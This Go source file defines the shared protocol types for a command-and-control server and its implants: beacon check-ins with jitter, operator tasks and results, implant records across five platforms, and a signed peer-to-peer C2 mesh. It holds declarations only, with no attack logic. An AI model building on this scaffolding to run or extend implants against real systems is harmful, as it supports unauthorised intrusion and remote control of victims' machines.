// Package protocol defines shared types between C2 server and implants.
package protocol

import "time"

// ImplantType identifies which platform the implant runs on.
type ImplantType string

const (
	ImplantWindows ImplantType = "windows"
	ImplantLinux   ImplantType = "linux"
	ImplantMacOS   ImplantType = "darwin"
	ImplantAndroid ImplantType = "android"
	ImplantIOS     ImplantType = "ios"
)

// BeaconPayload is sent by the implant on each check-in.
type BeaconPayload struct {
	ID        string      `json:"id"`
	Type      ImplantType `json:"type"`
	Target    string      `json:"target"`
	Timestamp int64       `json:"ts"`
	Jitter    float64     `json:"jitter"`
	Hostname  string      `json:"hostname,omitempty"`
	Arch      string      `json:"arch,omitempty"`
	PeerAddr  string      `json:"peer_addr,omitempty"`
}

// Task is a command issued by the operator/C2 to the implant.
type Task struct {
	ID        string         `json:"id"`
	Type      string         `json:"type"`
	Payload   map[string]any `json:"payload"`
	Timestamp int64          `json:"ts"`
	TTL       int            `json:"ttl,omitempty"` // seconds
}

// TaskResult is the implant's response to a task.
type TaskResult struct {
	TaskID    string `json:"task_id"`
	Success   bool   `json:"success"`
	Output    string `json:"output,omitempty"`
	Error     string `json:"error,omitempty"`
	Timestamp int64  `json:"ts"`
}

// ImplantRecord stored in DB.
type ImplantRecord struct {
	ID          string    `json:"id"`
	Type        string    `json:"type"`
	TargetProc  string    `json:"target_proc"`
	Hostname    string    `json:"hostname"`
	Arch        string    `json:"arch"`
	FirstSeen   time.Time `json:"first_seen"`
	LastSeen    time.Time `json:"last_seen"`
	BeaconCount int       `json:"beacon_count"`
	TasksSent   int       `json:"tasks_sent"`
	TasksDone   int       `json:"tasks_done"`
	JitterScore float64   `json:"jitter_score"`
	DNSEnabled  bool      `json:"dns_enabled"`
	MeshEnabled bool      `json:"mesh_enabled"`
	Flagged     bool      `json:"flagged"`
	NodeID      string    `json:"node_id,omitempty"` // which C2 node owns it
}

// MeshNode represents a peer C2 node in the mesh.
type MeshNode struct {
	ID        string    `json:"id"`
	Addr      string    `json:"addr"`
	PublicKey []byte    `json:"pubkey"`
	LastSeen  time.Time `json:"last_seen"`
	Implants  int       `json:"implants"`
	Version   string    `json:"version"`
}

// MeshHeartbeat is exchanged between mesh peers.
type MeshHeartbeat struct {
	NodeID    string   `json:"node_id"`
	Addr      string   `json:"addr"`
	Implants  []string `json:"implant_ids"`
	Timestamp int64    `json:"ts"`
	Signature []byte   `json:"sig"`
}

// APIConfig is returned to authenticated operators.
type APIConfig struct {
	Version  string `json:"version"`
	C2ID     string `json:"c2_id"`
	Implants int    `json:"implants"`
	Peers    int    `json:"peers"`
	Uptime   string `json:"uptime"`
}
